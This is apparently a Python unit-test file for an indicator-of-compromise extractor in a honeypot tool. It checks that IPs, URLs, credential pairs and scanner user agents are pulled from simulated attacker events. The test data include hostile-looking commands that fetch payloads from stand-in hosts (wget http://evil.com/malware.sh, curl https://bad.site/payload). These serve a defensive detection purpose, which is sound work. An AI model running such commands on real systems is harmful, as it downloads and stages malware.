"""Tests for the IOC extractor."""

import unittest
from datetime import datetime, timezone

from honeytrap.events import HoneypotEvent, EventType
from honeytrap.analysis.ioc_extractor import IOCExtractor


def _make_event(
    event_type: EventType = EventType.COMMAND,
    protocol: str = "ssh",
    source_ip: str = "203.0.113.50",
    data: dict | None = None,
) -> HoneypotEvent:
    return HoneypotEvent(
        id="test-ioc-1",
        timestamp=datetime.now(timezone.utc),
        sensor_id="test-sensor",
        session_id="test-session-1",
        protocol=protocol,
        event_type=event_type,
        source_ip=source_ip,
        source_port=54321,
        data=data or {},
    )


class TestIOCExtractor(unittest.TestCase):
    def setUp(self):
        self.extractor = IOCExtractor()

    def test_extracts_source_ip(self):
        event = _make_event(source_ip="198.51.100.10")
        iocs = self.extractor.extract_from_event(event)
        ip_iocs = [i for i in iocs if i.type == "ip_address"]
        self.assertTrue(any(i.value == "198.51.100.10" for i in ip_iocs))

    def test_extracts_url_from_wget(self):
        event = _make_event(data={"command": "wget http://evil.com/malware.sh"})
        iocs = self.extractor.extract_from_event(event)
        url_iocs = [i for i in iocs if i.type == "url"]
        self.assertTrue(any("evil.com/malware.sh" in i.value for i in url_iocs))

    def test_extracts_url_from_curl(self):
        event = _make_event(data={"command": "curl https://bad.site/payload -o /tmp/x"})
        iocs = self.extractor.extract_from_event(event)
        url_iocs = [i for i in iocs if i.type == "url"]
        self.assertTrue(any("bad.site/payload" in i.value for i in url_iocs))

    def test_filters_private_ips(self):
        event = _make_event(source_ip="192.168.1.100")
        iocs = self.extractor.extract_from_event(event)
        ip_iocs = [i for i in iocs if i.type == "ip_address"]
        self.assertFalse(any(i.value == "192.168.1.100" for i in ip_iocs))

    def test_filters_loopback(self):
        event = _make_event(source_ip="127.0.0.1")
        iocs = self.extractor.extract_from_event(event)
        ip_iocs = [i for i in iocs if i.type == "ip_address"]
        self.assertFalse(any(i.value == "127.0.0.1" for i in ip_iocs))

    def test_extracts_credential_pair(self):
        event = _make_event(
            event_type=EventType.AUTH_ATTEMPT,
            data={"username": "admin", "password": "admin123"},
        )
        iocs = self.extractor.extract_from_event(event)
        cred_iocs = [i for i in iocs if i.type == "credential_pair"]
        self.assertGreaterEqual(len(cred_iocs), 1)
        self.assertTrue(any("admin:admin123" in i.value for i in cred_iocs))

    def test_extracts_user_agent(self):
        event = _make_event(
            event_type=EventType.HTTP_REQUEST,
            protocol="http",
            data={"user_agent": "sqlmap/1.7", "method": "GET", "path": "/"},
        )
        iocs = self.extractor.extract_from_event(event)
        ua_iocs = [i for i in iocs if i.type == "user_agent"]
        self.assertTrue(any("sqlmap" in i.value for i in ua_iocs))

    def test_confidence_scoring(self):
        event = _make_event(source_ip="203.0.113.50")
        iocs = self.extractor.extract_from_event(event)
        ip_iocs = [i for i in iocs if i.type == "ip_address" and i.value == "203.0.113.50"]
        self.assertEqual(len(ip_iocs), 1)
        self.assertEqual(ip_iocs[0].confidence, 1.0)  # direct connection IP

    def test_deduplication(self):
        event = _make_event(
            data={"command": "wget http://evil.com/x && wget http://evil.com/x"}
        )
        iocs = self.extractor.extract_from_event(event)
        url_iocs = [i for i in iocs if i.type == "url" and "evil.com/x" in i.value]
        self.assertEqual(len(url_iocs), 1)  # deduplicated


if __name__ == "__main__":
    unittest.main()
